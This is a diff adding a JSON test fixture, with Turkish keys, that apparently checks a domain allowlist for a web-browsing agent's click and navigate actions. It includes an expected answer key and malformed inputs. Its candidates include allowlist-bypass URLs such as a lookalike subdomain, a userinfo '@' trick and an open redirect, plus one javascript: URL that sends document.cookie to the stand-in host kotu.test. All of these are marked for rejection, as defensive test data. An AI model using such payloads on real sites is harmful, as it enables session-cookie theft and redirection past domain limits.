@@ -1,0 +1,138 @@
+{
+ "aciklama": "Sayfadaki bağlantılardan çıkarılmış sentetik ajan eylem adayları. Hiçbirine istek gönderilmez.",
+ "izinli_alanlar": [
+  "destek.pafta.test",
+  "docs.pafta.test"
+ ],
+ "adaylar": [
+  {
+   "id": "e-01",
+   "eylem": "click",
+   "url": "https://destek.pafta.test/talep/42"
+  },
+  {
+   "id": "e-02",
+   "eylem": "navigate",
+   "url": "https://DOCS.pafta.test:443/kilavuz"
+  },
+  {
+   "id": "e-03",
+   "eylem": "click",
+   "url": "http://destek.pafta.test/"
+  },
+  {
+   "id": "e-04",
+   "eylem": "click",
+   "url": "https://destek.pafta.test.kotu.test/giris"
+  },
+  {
+   "id": "e-05",
+   "eylem": "navigate",
+   "url": "https://kotu.test/yonlendir?r=destek.pafta.test"
+  },
+  {
+   "id": "e-06",
+   "eylem": "click",
+   "url": "https://destek.pafta.test@kotu.test/"
+  },
+  {
+   "id": "e-07",
+   "eylem": "click",
+   "url": "https://destek.pafta.test:8443/"
+  },
+  {
+   "id": "e-08",
+   "eylem": "click",
+   "url": "https://destek.pafta.test:99999/"
+  },
+  {
+   "id": "e-09",
+   "eylem": "click",
+   "url": "https://alt.destek.pafta.test/"
+  },
+  {
+   "id": "e-10",
+   "eylem": "click",
+   "url": "javascript:fetch('https://kotu.test/'+document.cookie)"
+  },
+  {
+   "id": "e-11",
+   "eylem": "navigate",
+   "url": "https://destek.pafta.test./talep"
+  }
+ ],
+ "beklenen": {
+  "izinli": [
+   "e-01",
+   "e-02"
+  ],
+  "reddedilen": [
+   "e-03",
+   "e-04",
+   "e-05",
+   "e-06",
+   "e-07",
+   "e-08",
+   "e-09",
+   "e-10",
+   "e-11"
+  ]
+ },
+ "bozuk_girdiler": [
+  {
+   "adaylar": [
+    {
+     "id": "x",
+     "eylem": "submit",
+     "url": "https://destek.pafta.test/"
+    }
+   ],
+   "izinli_alanlar": [
+    "destek.pafta.test",
+    "docs.pafta.test"
+   ]
+  },
+  {
+   "adaylar": [
+    {
+     "id": "e-01",
+     "eylem": "click",
+     "url": "https://destek.pafta.test/talep/42"
+    },
+    {
+     "id": "e-01",
+     "eylem": "click",
+     "url": "https://destek.pafta.test/talep/42"
+    }
+   ],
+   "izinli_alanlar": [
+    "destek.pafta.test",
+    "docs.pafta.test"
+   ]
+  },
+  {
+   "adaylar": [
+    {
+     "id": "e-01",
+     "eylem": "click",
+     "url": "https://destek.pafta.test/talep/42",
+     "hedef": "#form"
+    }
+   ],
+   "izinli_alanlar": [
+    "destek.pafta.test",
+    "docs.pafta.test"
+   ]
+  },
+  {
+   "adaylar": [
+    {
+     "id": "e-01",
+     "eylem": "click",
+     "url": "https://destek.pafta.test/talep/42"
+    }
+   ],
+   "izinli_alanlar": "destek.pafta.test"
+  }
+ ]
+}
